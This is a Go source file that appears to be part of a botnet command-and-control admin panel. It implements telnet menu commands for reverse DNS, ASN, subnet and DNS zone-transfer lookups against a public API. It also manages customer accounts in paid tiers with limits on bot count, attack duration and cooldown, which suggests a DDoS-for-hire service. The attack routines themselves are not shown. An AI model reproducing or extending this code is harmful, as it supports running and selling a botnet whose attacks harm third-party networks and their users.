		if cmd == "/reversedns" || cmd == "/REVERSEDNS" {
			this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/asnlookup" || cmd == "/asnlookup" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
			this.conn.Write([]byte("\x1b[1;32mIPv4 Or Website (Without www.)\x1b[1;32m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
			continue
		}
	}
}

func (this *Admin) handleAddUser(isAdmin bool) {
	this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
	new_un, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
	new_pw, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Select tier
	this.conn.Write([]byte("\x1b[1;32mTier (basic/premium/vip/admin):\x1b[0m "))
	tier, err := this.ReadLine(false)
	if err != nil {
		return
	}
	tier = strings.ToLower(tier)

	// Validate tier
	validTiers := map[string]bool{"basic": true, "premium": true, "vip": true, "admin": true}
	if !validTiers[tier] {
		this.conn.Write([]byte("\x1b[1;31mInvalid tier. Use: basic, premium, vip, or admin\x1b[0m\r\n"))
		return
	}

	// Get tier config
	tierConfig := TierPermissions[tier]

	// Show tier info
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTier: %s | Max Duration: %ds | Max Bots: %d\x1b[0m\r\n",
		tier, tierConfig.MaxDuration, tierConfig.MaxBots))

	// For basic/premium, ask for custom max_bots if needed
	max_bots := tierConfig.MaxBots
	if tier == TierBasic || tier == TierPremium {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mCustom Botcount (-1 for default %d):\x1b[0m ", max_bots)))
		max_bots_str, err := this.ReadLine(false)
		if err != nil {
			return
		}
		custom_bots, err := strconv.Atoi(max_bots_str)
		if err == nil && custom_bots > 0 {
			max_bots = custom_bots
		}
	}

	// Cooldown (for non-admin tiers)
	cooldown := 0
	if tier != TierAdmin {
		this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
		cooldown_str, err := this.ReadLine(false)
		if err != nil {
			return
		}
		cooldown, err = strconv.Atoi(cooldown_str)
		if err != nil {
			this.conn.Write([]byte("\x1b[1;31mInvalid cooldown\x1b[0m\r\n"))
			return
		}
	}

	var success bool
	switch tier {
	case TierBasic:
		success = database.CreateBasic(new_un, new_pw, max_bots, 0, cooldown)
	case TierPremium:
		success = database.CreatePremium(new_un, new_pw, max_bots, 0, cooldown)
	case TierVIP:
		success = database.CreateVIP(new_un, new_pw, max_bots, 0, cooldown)
	case TierAdmin:
		success = database.CreateAdmin(new_un, new_pw, max_bots, 0, cooldown)
	}

	if success {
		this.conn.Write([]byte("\x1b[1;32mUser created successfully!\x1b[0m\r\n"))
	} else {
		this.conn.Write([]byte("\x1b[1;31mFailed to create user (may already exist)\x1b[0m\r\n"))
	}
}

// Quick add user with preset tier - easier user creation
func (this *Admin) handleQuickAddUser(tier string) {
	this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
	new_un, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
	new_pw, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get tier config
	tierConfig := TierPermissions[tier]

	// Show tier info
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mCreating %s tier user | Max Duration: %ds | Max Bots: %d\x1b[0m\r\n",
		tier, tierConfig.MaxDuration, tierConfig.MaxBots))

	// Use default max_bots from tier
	max_bots := tierConfig.MaxBots

	// Cooldown (default 30 seconds for non-admin)
	cooldown := 30
	if tier == TierAdmin {
		cooldown = 0
	}

	var success bool
	switch tier {
	case TierBasic:
		success = database.CreateBasic(new_un, new_pw, max_bots, 0, cooldown)
	case TierPremium:
		success = database.CreatePremium(new_un, new_pw, max_bots, 0, cooldown)
	case TierVIP:
		success = database.CreateVIP(new_un, new_pw, max_bots, 0, cooldown)
	case TierAdmin:
		success = database.CreateAdmin(new_un, new_pw, max_bots, 0, cooldown)
	}

	if success {
		user := database.GetUserByUsername(new_un)
		if user != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m✓ User '%s' created successfully!\x1b[0m\r\n", new_un)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m  API Key: %s\x1b[0m\r\n", user.APIKey)))
			this.conn.Write([]byte("\x1b[1;33m  Share API key with user for API access\x1b[0m\r\n"))
		} else {
			this.conn.Write([]byte("\x1b[1;32m✓ User created successfully!\x1b[0m\r\n"))
		}
	} else {
		this.conn.Write([]byte("\x1b[1;31m✗ Failed to create user (may already exist)\x1b[0m\r\n"))
	}
}

func (this *Admin) handleRemoveUser() {
	this.conn.Write([]byte("\x1b[1;32mUsername to remove:\x1b[0m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if database.RemoveUser(username) {
		this.conn.Write([]byte("\x1b[1;32mUser removed\x1b[0m\r\n"))
	} else {
		this.conn.Write([]byte("\x1b[1;31mUser not found\x1b[0m\r\n"))
	}
}

func (this *Admin) handleUpgradeUser() {
	this.conn.Write([]byte("\x1b[1;32mUsername to upgrade:\x1b[0m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	
	this.conn.Write([]byte("\x1b[1;32mNew tier (basic/premium/vip/admin):\x1b[0m "))
	newTier, err := this.ReadLine(false)
	if err != nil {
		return
	}
	newTier = strings.ToLower(newTier)
	
	// Validate tier
	validTiers := map[string]bool{"basic": true, "premium": true, "vip": true, "admin": true}
	if !validTiers[newTier] {
		this.conn.Write([]byte("\x1b[1;31mInvalid tier. Use: basic, premium, vip, or admin\x1b[0m\r\n"))
		return
	}
	
	if database.UpgradeUser(username, newTier) {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mUser %s upgraded to %s tier!\x1b[0m\r\n", username, newTier)))
	} else {
		this.conn.Write([]byte("\x1b[1;31mUser not found\x1b[0m\r\n"))
	}
}

func (this *Admin) handleListUsers() {
	users := database.GetAllUsers()
	
	this.conn.Write([]byte("\x1b[1;36m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m║ \x1b[1;37mUsername            Tier          API Key                          \x1b[1;36m║\r\n"))
	this.conn.Write([]byte("\x1b[1;36m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
	
	for _, user := range users {
		tierStr := fmt.Sprintf("%-13s", user.Tier)
		apiKeyStr := fmt.Sprintf("%-32s", user.APIKey)
		if len(user.Username) > 19 {
			user.Username = user.Username[:19]
		}
		usernameStr := fmt.Sprintf("%-19s", user.Username)
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m║ \x1b[1;37m%s%s%s\x1b[1;36m║\r\n", usernameStr, tierStr, apiKeyStr)))
	}
	
	this.conn.Write([]byte("\x1b[1;36m╚═══════════════════════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTotal Users: %d\r\n", len(users))))
}

func (this *Admin) ReadLine(password bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			return string(buf[:bufPos]), nil
		}
		if !password {
			this.conn.Write(buf[bufPos : bufPos+1])
		}
		bufPos++
	}
}

// dummyAddr is a dummy net.Addr implementation for telnet TLS login compatibility
type dummyAddr struct{}

func (d *dummyAddr) Network() string { return "tls" }
func (d *dummyAddr) String() string  { return "0.0.0.0:0" }
